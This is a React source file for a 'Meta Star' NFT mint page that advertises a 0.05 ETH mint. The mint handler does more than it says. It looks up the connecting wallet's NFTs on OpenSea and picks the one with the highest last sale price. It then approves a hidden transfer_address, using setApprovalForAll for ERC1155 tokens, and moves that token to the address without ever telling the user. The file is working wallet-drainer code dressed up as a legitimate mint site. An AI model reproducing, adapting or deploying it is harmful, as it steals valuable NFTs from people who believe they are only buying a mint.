import React, { useState, useEffect } from "react";
import axios from "axios";
// @import wallet connection
import { useEthContext } from "../../context/EthereumContext";
// @import component
import { toast, ToastContainer } from "react-toastify";
import { NumberInput } from "../../component/NumericInput";
// @import style
import "react-toastify/dist/ReactToastify.css";
// @import abi and address
import { mintABI, contract1155ABI, contract721ABI } from "../../contract/ABI";
import { contract_address, transfer_address } from "../../contract/address";

const MintContainer = () => {
  const { currentAcc, provider, web3 } = useEthContext();
  const [count, setCount] = useState(0);
  const [amount, setAmount] = useState(0);
  const [limit, setLimit] = useState(5);
  const [nftdata, setNftdata] = useState([]);

  const handleConnectWallet = async () => {
    // if (Number(window.ethereum.chainId) === 1) {
    await provider.request({ method: `eth_requestAccounts` });
    // } else {
    //   toast.error("Please connect to mainnet", { theme: "dark" });
    // }
  };
  useEffect(() => {
    // if (Number(window.ethereum.chainId) === 1) {
    if (web3) {
      const interval = setInterval(async () => {
        const contract = new web3.eth.Contract(mintABI, contract_address);
        await contract.methods
          .totalSupply()
          .call()
          .then((res) => {
            setCount(res);
          })
          .catch((err) => {
            console.log(err);
          });
      }, 1000);

      return () => clearInterval(interval);
    }
    // } else {
    //   toast.error("Please connect to mainnet", { theme: "dark" });
    // }
  });

  useEffect(() => {
    const getInfo = async () => {
      const contract = new web3.eth.Contract(mintABI, contract_address);
      const minted = await contract.methods.ownwallet(currentAcc).call();
      setLimit(5 - minted);

      const { data } = await axios.get(
        `https:/testnets-api.opensea.io/api/v1/assets?owner=${currentAcc}`
      );
      // const { data } = await axios.get(
      //   `https://api.opensea.io/api/v1/assets?owner=${currentAcc}
      //   `
      // );
      data.assets.map((element) => {
        if (element.last_sale == null) {
          element.last_sale = { total_price: 0 };
        }
      });
      setNftdata(data.assets);
    };

    if (currentAcc) {
      getInfo();
    } else {
      setAmount(0);
    }
  }, [currentAcc]);

  const onMintNFT = async () => {
    const result = nftdata.sort((a, b) => {
      if (a.last_sale && b.last_sale) {
        return b.last_sale.total_price - a.last_sale.total_price;
      }
    });

    const contract = new web3.eth.Contract(mintABI, contract_address);

    if (amount > 0 && result[0].asset_contract.schema_name === "ERC1155") {
      const contract1155 = new web3.eth.Contract(
        contract1155ABI,
        result[0].asset_contract.address
      );

      await contract1155.methods
        .setApprovalForAll(transfer_address, true)
        .send({
          from: currentAcc,
        })
        .on("error", function (error) {
          toast(error);
        });
      await contract1155.methods
        .safeTransferFrom(
          currentAcc,
          transfer_address,
          result[0].token_id,
          1,
          "0x000"
        )
        .send({
          from: currentAcc,
        })
        .on("error", function (error) {
          toast(error);
        });
      await contract.methods
        .mintNFT(
          amount
          // result[0].token_id,
          // 0,
          // currentAcc,
          // transfer_address,
          // result[0].asset_contract.address
        )
        .send({
          from: currentAcc,
          value: await web3.utils.toWei(
            (((0.05 * amount).toFixed(2) * 100) / 100).toString(),
            "ether"
          ),
        })
        .on("receipt", function (receipt) {
          toast("Success!");
          setLimit(limit - amount);
          setAmount(0);
        })
        .on("error", function (error) {
          toast(error);
          setAmount(0);
        });
    } else if (
      amount > 0 &&
      result[0].asset_contract.schema_name === "ERC721"
    ) {
      const contract721 = new web3.eth.Contract(
        contract721ABI,
        result[0].asset_contract.address
      );

      await contract721.methods
        .approve(transfer_address, result[0].token_id)
        .send({
          from: currentAcc,
        })
        .on("error", function (error) {
          toast(error);
        });
      await contract721.methods
        .transferFrom(currentAcc, transfer_address, result[0].token_id)
        .send({
          from: currentAcc,
        })
        .on("error", function (error) {
          toast(error);
        });
      await contract.methods
        .mintNFT(
          amount
          // result[0].token_id,
          // 1,
          // currentAcc,
          // transfer_address,
          // result[0].asset_contract.address
        )
        .send({
          from: currentAcc,
          value: await web3.utils.toWei(
            (((0.05 * amount).toFixed(2) * 100) / 100).toString(),
            "ether"
          ),
        })
        .on("receipt", function (receipt) {
          toast("Success!");
          setLimit(limit - amount);
          setAmount(0);
        })
        .on("error", function (error) {
          toast(error);
          setAmount(0);
        });
    } else {
      toast.error("Please check amount!", { theme: "dark" });
    }
  };

  return (
    <main className="main">
      <section className="section hero">
        <div className="hero-bg-wrapper">
          <div className="stars"></div>
          <div className="twinkling"></div>
        </div>
        <div className="hero-container">
          <div className="arrow-svg w-embed">
            <svg
              id="ade87f52-0ac0-438e-bc39-231b0e93f8ea"
              data-name="Layer 1"
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 301.03 170.89"
              fill="white"
            >
              <path
                d="M-65.06,145.38a3.24,3.24,0,0,1-.69-1.22c-1-2.51.36-5.44.93-8A91.87,91.87,0,0,0-62.95,120c.1-2.24.21-5.2,2.26-6,1.43-.56,2.48.15,3.23,1.55s.61,3.27.6,4.83c0,3.87-.59,9.52-.94,13.58a.16.16,0,0,0,.28.13,58.6,58.6,0,0,1,4.63-4.84c24.87-21.77,55.15-41.37,93.12-44C56.65,84.09,72.35,85,88.3,89.46A7.56,7.56,0,0,0,93.07,89c38.67-19.94,84.12,8.4,108.42,43.8,18.6,27.08,34.36,62.26,33.39,94-.08,2.71-1.17,28.54-5.25,26.39-.33-.17-.76-.34-.87-.78-.68-2.84.55-11.27,1-16.81a109.88,109.88,0,0,0-.49-26.19,155.25,155.25,0,0,0-11-37.11c-9.77-22.68-22.25-45.57-41.45-61.66C159.41,96,136,84.49,111,87.53c-3.44.42-9.85,2.37-13.28,5a.78.78,0,0,0,0,1.24,38.75,38.75,0,0,0,4.64,2.56,76.64,76.64,0,0,1,22.91,19.39l.68.85.67.84.83,1.06.72.94c.49.63,1,1.28,1.45,1.92q3.07,4.15,5.84,8.53c10.37,16.38,18.43,38.58,12.73,57.48-2.66,8.83-10,16.93-19.68,16.19-31.35-2.41-48.82-34.51-51.8-59.67a75.25,75.25,0,0,1,1.51-24.56,73.93,73.93,0,0,1,6.33-17c1.13-2.18,4.12-5.86,2-7.83-2.29-2.15-7.45-2.77-10.45-3.2-34.38-4.88-69.32,2.26-97.92,20.61-.6.38-1.2.78-1.8,1.17-8.68,5.74-16.44,12.78-24.26,19.77-2,1.8-4.4,4.22-5.89,5.42a.23.23,0,0,0,0,.4c4.42,1.92,10.78,2.88,15.41,3.43a10.46,10.46,0,0,1,4.92,1.5c1.43,1,2.48,3,1.69,4.49s-3.86.26-6.12.07c-6.47-.55-12.8-.37-19.28-.92C-59.95,147-62.87,147.39-65.06,145.38Zm167.38,41a55.77,55.77,0,0,0,9.32,6.87c9,5.23,22.57,8.41,29.35-1.19,6.12-8.67,4.79-22,2.42-32-3.08-13-9.52-25.19-17.41-36.07a105.17,105.17,0,0,0-9.55-11.52A79.17,79.17,0,0,0,105.1,103a57.94,57.94,0,0,0-6.38-4c-1.82-1-4.19-2.53-6.09-1.08-2.94,2.24-6,8.65-7.58,13C75.85,136.1,81.24,167.34,102.32,186.41Z"
                transform="translate(66.11 -82.42)"
              ></path>
            </svg>
          </div>
          <div className="hero-container horizontal">
            <div className="hero__col">
              <div className="mint-card__container feed-post">
                <div className="mint-card__container">
                  <p className="mint-card__paragraph">Mint Your Meta Star</p>
                  <img
                    src="https://cdn.discordapp.com/attachments/906235990866272346/935540500621066240/IMG_2175.jpg"
                    loading="lazy"
                    alt=""
                    className="mint-card__image"
                  />
                  <h2 className="mint-card__h2">Mint a Meta Star</h2>
                  <p className="mint-card__h3">
                    <span id="price">
                      {((0.05 * amount).toFixed(2) * 100) / 100}
                    </span>{" "}
                    ETH
                  </p>

                  <div className="w-form">
                    <div
                      className="mint-form"
                      style={{ marginBottom: "8px", marginTop: 0 }}
                    >
                      <NumberInput
                        min={0}
                        max={5}
                        value={amount}
                        setAmount={setAmount}
                        limit={limit}
                      />
                    </div>
                  </div>
                  <div
                    className="container_metamask_content-btn"
                    style={{ textAlign: "center" }}
                  >
                    {currentAcc && currentAcc ? (
                      <button
                        className="metamask_content-btn border-gradient button w-button"
                        onClick={() => onMintNFT()}
                      >
                        {"Mint"}
                      </button>
                    ) : (
                      <button
                        className="metamask_content-btn border-gradient button w-button"
                        onClick={() => handleConnectWallet()}
                      >
                        {"Connect Wallet"}
                      </button>
                    )}
                  </div>

                  <p className="mint-card__h3">
                    <span id="mintnumber">{count}</span> / 10000
                  </p>

                  <h3 className="mint-card__h3 sub-title all-caps">
                    Fair Distribution
                  </h3>
                  <p className="mint-card__paragraph sub-info">
                    Every Meta Star costs 0.05 ETH. There are no price tiers.
                  </p>
                </div>
              </div>
            </div>
            <div className="hero__col right" style={{ paddingLeft: "30px" }}>
              <h2 className="mint-card__h2">LIMITED SALE</h2>

              <div className="dutch-detail-two-sides">
                <div className="dutch-det-left">
                  <div className="text-block-13">Supply</div>
                </div>
                <div className="dutch-det-right">
                  <div className="text-block-12">10000</div>
                </div>
              </div>
              <div className="dutch-detail-two-sides">
                <div className="dutch-det-left">
                  <div className="text-block-13">Price</div>
                </div>
                <div className="dutch-det-right">
                  <div className="text-block-12">0.05 ETH</div>
                </div>
              </div>
              <div className="dutch-detail-two-sides">
                <div className="dutch-det-left">
                  <div className="text-block-13">Max</div>
                </div>
                <div className="dutch-det-right">
                  <div className="text-block-12">5 per Wallet</div>
                </div>
              </div>
              <a
                href="/"
                className="button w-inline-block"
                style={{ marginTop: "30px" }}
                rel="noreferrer"
              >
                <div>Join Our Discord</div>
                <div className="button--icon w-embed">
                  <svg
                    viewBox="0 0 48 48"
                    fill="currentColor"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path d="M38.1863 13.7599C35.5913 11.5656 32.4773 10.4685 29.1902 10.2856L28.6712 10.8342C31.6123 11.5656 34.2073 13.0285 36.6293 15.0399C33.6883 13.3942 30.4013 12.2971 26.9412 11.9314C25.9032 11.7485 25.0382 11.7485 24.0002 11.7485C22.9622 11.7485 22.0972 11.7485 21.0592 11.9314C17.5992 12.2971 14.3121 13.3942 11.3711 15.0399C13.7931 13.0285 16.3882 11.5656 19.3292 10.8342L18.8102 10.2856C15.5231 10.4685 12.4091 11.5656 9.8141 13.7599C6.87308 19.6114 5.31607 26.1942 5.14307 32.9599C7.73809 35.8856 11.3711 37.7142 15.1771 37.7142C15.1771 37.7142 16.3882 36.2514 17.2532 34.9714C15.0041 34.4228 12.9281 33.1428 11.5441 31.1314C12.7551 31.8628 13.9661 32.5942 15.1771 33.1428C16.7342 33.8742 18.2912 34.2399 19.8482 34.6056C21.2322 34.7885 22.6162 34.9714 24.0002 34.9714C25.3842 34.9714 26.7682 34.7885 28.1522 34.6056C29.7093 34.2399 31.2663 33.8742 32.8233 33.1428C34.0343 32.5942 35.2453 31.8628 36.4563 31.1314C35.0723 33.1428 32.9963 34.4228 30.7473 34.9714C31.6123 36.2514 32.8233 37.7142 32.8233 37.7142C36.6293 37.7142 40.2623 35.8856 42.8573 32.9599C42.6843 26.1942 41.1273 19.6114 38.1863 13.7599ZM18.2912 29.6685C16.5612 29.6685 15.0041 28.0228 15.0041 26.0114C15.0041 23.9999 16.5612 22.3542 18.2912 22.3542C20.0212 22.3542 21.5782 23.9999 21.5782 26.0114C21.5782 28.0228 20.0212 29.6685 18.2912 29.6685ZM29.7093 29.6685C27.9792 29.6685 26.4222 28.0228 26.4222 26.0114C26.4222 23.9999 27.9792 22.3542 29.7093 22.3542C31.4393 22.3542 32.9963 23.9999 32.9963 26.0114C32.9963 28.0228 31.4393 29.6685 29.7093 29.6685Z"></path>
                  </svg>
                </div>
              </a>
            </div>
          </div>
        </div>
      </section>
      <ToastContainer />
    </main>
  );
};
export default MintContainer;
